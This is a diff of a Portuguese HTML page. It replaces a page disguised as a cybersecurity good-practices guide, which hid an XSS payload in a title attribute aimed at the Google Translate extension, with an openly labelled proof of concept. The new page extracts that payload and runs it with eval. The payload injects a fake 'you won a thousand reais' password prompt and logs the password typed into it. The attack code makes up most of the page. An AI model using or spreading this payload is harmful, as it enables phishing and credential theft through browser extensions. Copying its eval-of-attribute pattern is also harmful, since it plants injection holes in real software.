@@ -1,58 +1,39 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <title>Guia de Segurança Cibernética</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      margin: 30px;
-    }
-    .alerta {
-      background-color: #f0f0f0;
-      border-left: 5px solid #007BFF;
-      padding: 10px;
-      margin-bottom: 20px;
-    }
-    .destaque {
-      font-weight: bold;
-      color: #555;
-    }
-  </style>
+  <meta charset="UTF-8" />
+  <title>Prova de Conceito XSS em Extensão do Tradutor</title>
 </head>
 <body>
-  <h1>Guia de Boas Práticas em Segurança Cibernética</h1>
-  <p>Este site apresenta dicas para proteger suas informações online.</p>
+  <h1>Teste de Segurança - Extensão Google Tradutor</h1>
 
-  <div class="alerta">
-    🛑 Nunca insira suas credenciais em páginas suspeitas.
-  </div>
-
-  <p class="destaque">Atenção:</p>
-  <p>Selecione e traduza a frase abaixo com a extensão do Google Tradutor:</p>
-
-  <!-- Payload malicioso que será interpretado na extensão -->
-  <p>
-    <span title="
+  <p id="demo" title='
     &lt;script&gt;
-      let p = document.createElement('p');
+      let p = document.createElement("p");
       p.innerHTML = `
-        &lt;div style='background:black;color:lime;font-size:18px;padding:10px;margin-top:10px;'&gt;
+        &lt;div style="background:black;color:lime;font-size:18px;padding:10px;margin-top:10px;"&gt;
           🔒 VOCÊ GANHOU MIL REAIS, ENTRE COM SUA SENHA PARA RESGATAR:
         &lt;/div&gt;
-        &lt;input id='fake-pass' type='password' placeholder='SENHA AQUI' style='padding:5px;margin-top:5px;'&gt;
+        &lt;input id="fake-pass" type="password" placeholder="SENHA AQUI" style="padding:5px;margin-top:5px;"&gt;
       `;
       document.body.appendChild(p);
-      document.getElementById('fake-pass').addEventListener('keydown', function(e) {
-        if (e.key === 'Enter') {
-          console.log('Senha digitada:', this.value);
+      document.getElementById("fake-pass").addEventListener("keydown", function(e) {
+        if(e.key === "Enter"){
+          console.log("Senha digitada:", this.value);
         }
       });
     &lt;/script&gt;
-    ">
-      Clique aqui para ver um exemplo prático de ataque XSS em extensões
-    </span>
-  </p>
+  '>Passe o mouse aqui para ver um exemplo prático</p>
+
+  <script>
+    // Forçar execução do código do atributo title só pra demonstrar (não faça em produção)
+    const el = document.getElementById("demo");
+    const code = el.getAttribute("title");
+    const scriptMatch = code.match(/&lt;script&gt;([\s\S]*?)&lt;\/script&gt;/);
+    if (scriptMatch) {
+      eval(scriptMatch[1]);
+    }
+  </script>
 </body>
 </html>
 
